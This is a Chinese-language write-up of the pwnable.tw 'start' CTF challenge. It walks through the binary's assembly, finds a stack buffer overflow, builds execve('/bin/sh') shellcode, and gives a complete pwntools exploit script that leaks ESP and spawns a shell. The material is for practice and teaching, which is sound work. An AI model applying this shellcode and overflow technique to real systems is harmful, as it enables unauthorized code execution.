---
title: pwnable.tw 0x0 start writeup
date: 2019-02-13 01:42:41
tags: [pwn,overflow]
---

> 地址：[https://pwnable.tw/challenge/#1](https://pwnable.tw/challenge/#1)

## 分析

下载 `start` 可执行文件，放到 Linux 虚拟机中，先 file 一下:

```
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

32bit 可执行程序。

执行一下：

```
Let's start the CTF:
```

有个输入提示，随便输入点儿啥，回车就结束了，啥都没有发生。

用 `radare2` 打开分析一下：

`aa` 分析二进制文件
`afl` 列出所有 function 
`pdf` 反汇编 function

如下：
![-w1118](https://i.loli.net/2019/02/13/5c6306387eeb8.jpg)

 
汇编很短，简单注释一下（可以用 `objdump -M intel start` 导出）：

```asm
08048060 <_start>:
 // 保存 ESP
 8048060:	54                   	push   esp
 
 // 保存程序返回地址
 8048061:	68 9d 80 04 08       	push   0x804809d
 8048066:	31 c0                	xor    eax,eax
 8048068:	31 db                	xor    ebx,ebx
 804806a:	31 c9                	xor    ecx,ecx
 804806c:	31 d2                	xor    edx,edx

 // 把 "Let's start the CTF:" 放到栈里
 804806e:	68 43 54 46 3a       	push   0x3a465443
 8048073:	68 74 68 65 20       	push   0x20656874
 8048078:	68 61 72 74 20       	push   0x20747261
 804807d:	68 73 20 73 74       	push   0x74732073
 8048082:	68 4c 65 74 27       	push   0x2774654c

 // 调用 Linux System Call 输出 "Let's start the CTF:"
 8048087:	89 e1                	mov    ecx,esp
 8048089:	b2 14                	mov    dl,0x14
 804808b:	b3 01                	mov    bl,0x1
 804808d:	b0 04                	mov    al,0x4
 804808f:	cd 80                	int    0x80

 // 调用 Linux System Call 接收用户输入，buffer 大小为 0x3c 
 8048091:	31 db                	xor    ebx,ebx
 8048093:	b2 3c                	mov    dl,0x3c
 8048095:	b0 03                	mov    al,0x3
 8048097:	cd 80                	int    0x80
 
 // 退栈
 8048099:	83 c4 14             	add    esp,0x14
 804809c:	c3                   	ret

0804809d <_exit>:
 804809d:	5c                   	pop    esp
 804809e:	31 c0                	xor    eax,eax
 80480a0:	40                   	inc    eax
 80480a1:	cd 80                	int    0x80
```

[Linux System Call Table 参考](https://www.cs.utexas.edu/~bismith/test/syscalls/syscalls32.html)

简单介绍一下 Linux System Call 的调用规范：调用号放置在 `eax` 中，参数依次放入 `ebx`、`ecx`、`edx` 等寄存器中，之后 `int 80` 执行调用，返回值会放入到 `eax` 中。

start 里使用了3号和4号调用完成输出到终端和从终端读入的功能，从 [Linux System Call Table 参考](https://www.cs.utexas.edu/~bismith/test/syscalls/syscalls32.html) 中可知，3/4号调用需要 3 个参数：

* `ebx`: 文件指针
* `ecx`: 输入/输入出缓冲区首地址
* `edx`: 输出字节数



所以输入/输出部分汇编注释如下：

```asm
// 调用 Linux System Call 输出 "Let's start the CTF:"
 8048087:	89 e1                	mov    ecx,esp // 栈顶为输出缓冲首地址
 8048089:	b2 14                	mov    dl,0x14 // 共输出 20 个字符
 804808b:	b3 01                	mov    bl,0x1  // 输出到 stdout （0: stdin, 1: stdout, 2: stderr）
 804808d:	b0 04                	mov    al,0x4  // 调用号4
 804808f:	cd 80                	int    0x80    // 调用
 
// 调用 Linux System Call 接收用户输入，buffer 大小为 0x3c 
 8048091:	31 db                	xor    ebx,ebx  // exb = 0, stdin
 8048093:	b2 3c                	mov    dl,0x3c  // 共接收 60 个字符
 8048095:	b0 03                	mov    al,0x3   // 调用号3
 8048097:	cd 80                	int    0x80     // 调用
```

注意接收用户输入部分，`ecx` 未进行操作，值仍为之前设置的栈顶位置，所以用户输入会入栈。同时，"Let's start the CTF:" 在栈中共占据 0x14 个字节，接收时却最大可以输入 0x3c 个字节，显然，这里存在栈溢出！

简单梳理下接收用户参数前，
```
             H +----------------+
               |   Pushed ESP   |
               +----------------+
               |     _exit      |
               +----------------+    <---
               |      CTF:      |      |
               +----------------+      |
               |      the       |      |
               +----------------+      |
               |      art       |    0x14 bytes
               +----------------+      |  
               |      s st      |      |
               +----------------+      |
               |      Let'      |      |
ESP/ECX ---> L +----------------+    <---
```

在输入的过程中，用户输入的数据会从低地址开始依次覆盖栈中的内容，所以，如果用户输入长度超过20，就会把栈底的返回地址和 保存的 ESP 给覆盖了。

## GetShell

使用 `peda` 载入可执行程序后，`checksec` 分析应用启用的安全措施，如下：

![-w180](https://i.loli.net/2019/02/13/5c6306380262c.jpg)

显示 NX（Not Execute）已启用，然而 `pwntools` 里的 `checksec` 命令检查 NX 是 disable 掉的，事实上也确实是 disable 的。

![-w493](https://i.loli.net/2019/02/13/5c6306380cd2d.jpg)

既然没有任何安全措施，栈也是可执行的，我们可以直接把 shellcode 布置在栈上，然后构造参数通过 `int 80` 调用 `sys_execve` 执行 `/bin/sh`。

### 构造 shellcode

目前我们的思路已经清晰了，就是通过 `sys_execve` 执行 `/bin/sh`。依据 [Linux System Call Table 参考](https://www.cs.utexas.edu/~bismith/test/syscalls/syscalls32.html)， `sys_execve` 仅需要一个参数：可执行文件路径，放到 ebx 中，所以，我们得把 `/bin/sh` 这个字符串放到栈中。`/bin/sh` 一共7个字符，为了凑够 8 个字节，我们把 `/bin/sh` 处理成 `/bin//sh`。

```asm
xor    eax,eax     // 清空 eax
push   eax         // 放个0到栈里，当作字符串结束
push   0x68732f2f  // "//sh" 入栈, 0x68732f2f 是 "//sh" 的 ASCII 16进制编码
push   0x6e69622f  // "/bin" 入栈。
mov    ebx,esp     // 把 "/bin//sh" 的地址赋值给 ebx，这是 sys_execve 的要求
xor    ecx,ecx     // 清空 ecx
xor    edx,edx     // 清空 ecx
mov    al,0xb      // 设置调用号 0xb(11)
int 0x80           // 调用 system call
```

### PWN
在前边我们已经构造好了 shellcode，下边就使用 `pwntools` 进行本地测试以及获取 flag。

我们需要覆盖程序的返回地址达到控制程序流程的目的，所以我们需要获取 `esp` 的地址，注意地址为 `0x8048087` 的这条指令，是输出部分的代码，恰好将 `esp` 的地址赋值给了 `ecx`，我们可以将返回地址覆盖为 `0x8048087` 从而得到 `esp` 地址。

因为我们把程序返回地址修改为了输入部分，所以可以继续输入，再次输入，将 shellcode 覆盖在返回地址之后，将返回地址覆盖为 shellcode 开始的位置即可。
代码如下：

```python
# -*- coding: UTF-8
# pwnable.tw callenge "start" pwn script
import sys
from pwn import *

SHELLCODE = '''
xor    eax,eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
xor    ecx,ecx
xor    edx,edx
mov    al,0xb
int    0x80
'''

NORMAL_INPUT_LEN = 0x14

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == 'pwn':
        proc = remote('chall.pwnable.tw', 10000)
    else:
        proc = process('./start')

    # 泄漏 esp
    payload = 'a' * NORMAL_INPUT_LEN + p32(0x8048087)
    proc.send(payload)
    proc.recvuntil(':')

    esp_addr = u32(proc.recv(4))
    print('ESP addr is: ', hex(esp_addr))

    # 发送 shellcode，get shell    
    context.arch = 'i386'
    shellcode = asm(SHELLCODE)    

    payload = 'a' * NORMAL_INPUT_LEN # 正常的最大输入 20 个字符
    payload += p32(esp_addr + NORMAL_INPUT_LEN) # 覆盖 _exit
    payload += shellcode
    proc.send(payload)

    proc.interactive()
```

栈变化如下：
开始时：
```
             H +----------------+
               |   Pushed ESP   |
               +----------------+
               |     _exit      |
               +----------------+    <---
               |      CTF:      |      |
               +----------------+      |
               |      the       |      |
               +----------------+      |
               |      art       |    0x14 bytes              
               +----------------+      |  
               |      s st      |      |
               +----------------+      |
               |      Let'      |      |
ESP/ECX ---> L +----------------+    <---
```
泄漏 ESP 时：

```

             H +----------------+
               |   Pushed ESP   |
               +----------------+
               |   0x8048087    |
               +----------------+    <---
               |      aaaa      |      |
               +----------------+      |
               |      aaaa      |      |
               +----------------+      |
               |      aaaa      |    0x14 bytes
               +----------------+      |  
               |      aaaa      |      |
               +----------------+      |
               |      aaaa      |      |
ESP --->     L +----------------+    <---
```

Get shell 时：

```
             H +----------------+
               |      ...       |
               +----------------+
               |    shellcode   |
               +----------------+
               |   esp + 0x14   |
               +----------------+    <---
               |      aaaa      |      |
               +----------------+      |
               |      aaaa      |      |
               +----------------+      |
               |      aaaa      |    0x14 bytes
               +----------------+      |  
               |      aaaa      |      |
               +----------------+      |
               |      aaaa      |      |
ESP --->     L +----------------+    <---
```